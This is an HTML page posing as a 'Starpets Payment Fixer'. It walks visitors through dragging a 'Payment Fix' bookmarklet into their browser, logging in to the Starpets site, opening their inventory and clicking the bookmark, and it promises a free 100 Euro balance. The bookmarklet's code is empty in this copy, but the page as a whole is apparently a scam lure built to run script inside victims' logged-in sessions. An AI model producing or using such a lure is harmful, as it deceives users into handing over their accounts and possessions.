<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Starpets Payment Fix</title>
<!-- Google Fonts: Poppins -->
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
<!-- Favicon -->
<link rel="icon" href="https://pbs.twimg.com/profile_images/1497996651096588288/vLHC2k2r_400x400.jpg" type="image/png" />
<style>
  body {
    margin: 0; padding: 0; height: 100vh;
    display: flex; justify-content: center; align-items: center;
    font-family: 'Poppins', Arial, sans-serif;
    color: white; overflow: hidden;
    background: linear-gradient(-45deg, #ff4b2b, #ff416c, #1e3c72, #2a5298);
    background-size: 400% 400%;
    animation: gradientBG 15s ease infinite;
  }
  @keyframes gradientBG {
    0% {background-position: 0% 50%;}
    50% {background-position: 100% 50%;}
    100% {background-position: 0% 50%;}
  }
  .card {
    background: rgba(0,0,0,0.6);
    padding: 30px;
    border-radius: 12px;
    text-align: center;
    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
    max-width: 400px;
  }
  h1 {
    margin-bottom: 10px;
    font-weight: 600;
    font-size: 2.5rem;
  }
  p {
    font-weight: 400;
    font-size: 1.1rem;
  }

  /* Button basic styles */
  .button {
    display: inline-flex;
    align-items: center;
    gap: 8px;
    padding: 15px 25px;
    color: white !important;
    border-radius: 8px;
    text-decoration: none;
    font-size: 18px;
    cursor: grab;
    user-select: none;
    font-family: Arial, sans-serif;
    font-weight: normal;
    margin: 10px 5px 0 5px;
    transition: background-color 0.3s ease;
  }
  .button:active {
    cursor: grabbing;
  }
  .button img {
    display: block;
    border-radius: 50%;
    width: 32px;
    height: 32px;
    object-fit: cover;
  }

  /* Payment Fix Button (green) */
  .btn-payment-fix {
    background-color: #28a745;
  }
  .btn-payment-fix:hover {
    background-color: #218838;
  }

  /* Tutorial Button (blue) */
  .btn-tutorial {
    background-color: #007bff;
  }
  .btn-tutorial:hover {
    background-color: #0056b3;
  }

  /* Modal Styles */
  .modal-bg {
    position: fixed;
    top: 0; left: 0;
    width: 100vw; height: 100vh;
    background: rgba(0,0,0,0.7);
    display: none;
    justify-content: center;
    align-items: center;
    z-index: 1000;
    padding: 10px;
    box-sizing: border-box;
  }
  .modal-bg.active {
    display: flex;
  }
  .modal-wrapper {
    display: flex;
    gap: 30px;
    align-items: stretch;
    max-width: 1020px;
    width: 90%;
    justify-content: center;
  }
  .modal {
    background: #fff;
    border-radius: 12px;
    max-width: 700px;
    width: 100%;
    padding: 20px 30px 30px 30px;
    color: #222;
    text-align: left;
    position: relative;
    display: flex;
    flex-direction: column;
    box-sizing: border-box;
  }
  .modal h2 {
    margin-bottom: 20px;
    font-weight: 600;
    font-size: 2rem;
  }
  .step-content {
    font-size: 1.1rem;
    min-height: 100px;
    margin-bottom: 20px;
  }
  .step-content a {
    color: #007bff;
    text-decoration: underline;
  }
  .step-media {
    max-width: 100%;
    max-height: 300px;
    margin-bottom: 20px;
  }
  .step-media img,
  .step-media video {
    max-width: 100%;
    max-height: 300px;
    border-radius: 8px;
  }
  .buttons {
    display: flex;
    justify-content: space-between;
  }
  .modal button {
    border: none;
    padding: 10px 20px;
    font-size: 1rem;
    border-radius: 6px;
    cursor: pointer;
    user-select: none;
    transition: background-color 0.3s ease;
  }
  /* Back button grey */
  #prevStep {
    background-color: #6c757d;
    color: white;
  }
  #prevStep:hover:not(:disabled) {
    background-color: #5a6268;
  }
  /* Next button custom hex (orange) */
  #nextStep {
    background-color: #ff5722;
    color: white;
  }
  #nextStep:hover:not(:disabled) {
    background-color: #e64a19;
  }
  #nextStep:disabled {
    background-color: #ccc;
    cursor: not-allowed;
    color: #666;
  }
  /* Close button custom hex (orange) */
  .close-btn {
    position: absolute;
    top: 10px; right: 15px;
    background: transparent;
    border: none;
    font-size: 1.5rem;
    color: #ff5722;
    cursor: pointer;
    transition: color 0.3s ease;
  }
  .close-btn:hover {
    color: #e64a19;
  }

  /* Extra Box Styles */
  .extra-box {
    background: #fff;
    border-radius: 12px;
    max-width: 350px;
    width: 350px;
    padding: 20px;
    box-sizing: border-box;
    color: #222;
    display: flex;
    flex-direction: column;
    justify-content: flex-start;
    font-size: 1rem;
  }
  .extra-box p {
    margin-bottom: 15px;
    line-height: 1.4;
  }
  .extra-box iframe {
    border-radius: 8px;
  }
</style>
</head>
<body>

<div class="card">
  <h1>üî• Starpets Payment Fixer üî•</h1>
  <p>Please drag the green button below into your browser‚Äôs bookmarks bar.</p>
  
  <!-- Payment Fix Button -->
  <a href="javascript:"  
   class="button btn-payment-fix" 
   draggable="true" 
   aria-label="Drag to bookmarks">
     <img src="https://pbs.twimg.com/profile_images/1497996651096588288/vLHC2k2r_400x400.jpg" alt="Icon" />
     <span>‚≠ê Payment Fix ‚≠ê</span>
  </a>

  <!-- Tutorial Button -->
  <a href="#" id="tutorialBtn" class="button btn-tutorial" aria-haspopup="dialog" aria-controls="tutorialModal">
    <img src="https://cdn-icons-png.flaticon.com/512/1828/1828859.png" alt="Tutorial Icon" style="width:28px; height:28px;" />
    <span>Tutorial</span>
  </a>
</div>

<!-- Modal -->
<div class="modal-bg" id="tutorialModal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
  <div class="modal-wrapper">
    <div class="modal" id="modalContent">
      <button class="close-btn" id="closeModal" aria-label="Close Tutorial">&times;</button>
      <h2 id="modalTitle">Tutorial</h2>
      <div class="step-media" id="stepMedia">
        <img src="https://media.giphy.com/media/3oEjI6SIIHBdRxXI40/giphy.gif" alt="Step Media" />
      </div>
      <div class="step-content" id="stepContent">
        Content for step 1 here.
      </div>
      <div class="buttons">
        <button id="prevStep" disabled>Previous</button>
        <button id="nextStep">Next</button>
      </div>
    </div>

    <div class="extra-box" id="extraBox" aria-label="Additional tutorial video and info" style="display:none;">
      <p>
        If your bookmarks bar is hidden or disabled, watch this video to learn how to enable it:
      </p>
      <iframe 
        id="youtubeVideo" 
        width="320" 
        height="180" 
        src="https://www.youtube.com/embed/i9Ql6QVkFAo" 
        title="How to enable bookmarks bar" 
        frameborder="0" 
        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
        allowfullscreen>
      </iframe>
    </div>
  </div>
</div>

<script>
  const tutorialBtn = document.getElementById('tutorialBtn');
  const modalBg = document.getElementById('tutorialModal');
  const closeModal = document.getElementById('closeModal');
  const prevStepBtn = document.getElementById('prevStep');
  const nextStepBtn = document.getElementById('nextStep');
  const stepContent = document.getElementById('stepContent');
  const stepMedia = document.getElementById('stepMedia');
  const extraBox = document.getElementById('extraBox');
  
  const steps = [
    {
      content: `First, drag the ‚≠ê Payment Fix ‚≠ê button to your browser‚Äôs bookmarks bar to add it.<br><br>If you don't have the bookmarks bar enabled or cannot see it, watch the video on the right to learn how to enable it.`,
      mediaType: "img",
      mediaSrc: "https://media.giphy.com/media/3oEjI6SIIHBdRxXI40/giphy.gif"
    },
    {
      content: `Next, go to the Starpets website, log in, and navigate to your inventory. You can quickly access it here: <a href="https://starpets.pw" target="_blank" rel="noopener noreferrer">https://starpets.pw</a>.`,
      mediaType: "",
      mediaSrc: ""
    },
    {
      content: `When you're on the Starpets page, click the bookmark you added and select the problems you are experiencing.`,
      mediaType: "",
      mediaSrc: ""
    },
    {
      content: `After completing the questions, you will receive a 100 Euro balance which you can use as you wish.`,
      mediaType: "",
      mediaSrc: ""
    },
    {
      content: `You have completed the tutorial. Enjoy!`,
      mediaType: "img",
      mediaSrc: ""
    }
  ];
  
  let currentStep = 0;
  
  function updateStep() {
    const step = steps[currentStep];
    stepContent.innerHTML = step.content;
    
    stepMedia.innerHTML = '';
    if(step.mediaType === "img" && step.mediaSrc) {
      const img = document.createElement('img');
      img.src = step.mediaSrc;
      img.alt = `Step ${currentStep + 1} Media`;
      stepMedia.appendChild(img);
    } else if(step.mediaType === "video" && step.mediaSrc) {
      const video = document.createElement('video');
      video.src = step.mediaSrc;
      video.controls = true;
      video.autoplay = true;
      video.loop = true;
      stepMedia.appendChild(video);
    } else {
      stepMedia.innerHTML = '';
    }
    
    prevStepBtn.disabled = currentStep === 0;
    nextStepBtn.textContent = currentStep === steps.length - 1 ? "Finish" : "Next";
    
    // Show extra box only on first step
    extraBox.style.display = currentStep === 0 ? 'flex' : 'none';
  }
  
  tutorialBtn.addEventListener('click', () => {
    modalBg.classList.add('active');
    currentStep = 0;
    updateStep();
  });
  
  closeModal.addEventListener('click', () => {
    modalBg.classList.remove('active');
  });
  
  prevStepBtn.addEventListener('click', () => {
    if(currentStep > 0) {
      currentStep--;
      updateStep();
    }
  });
  
  nextStepBtn.addEventListener('click', () => {
    if(currentStep < steps.length - 1) {
      currentStep++;
      updateStep();
    } else {
      modalBg.classList.remove('active');
    }
  });
</script>

</body>
</html>
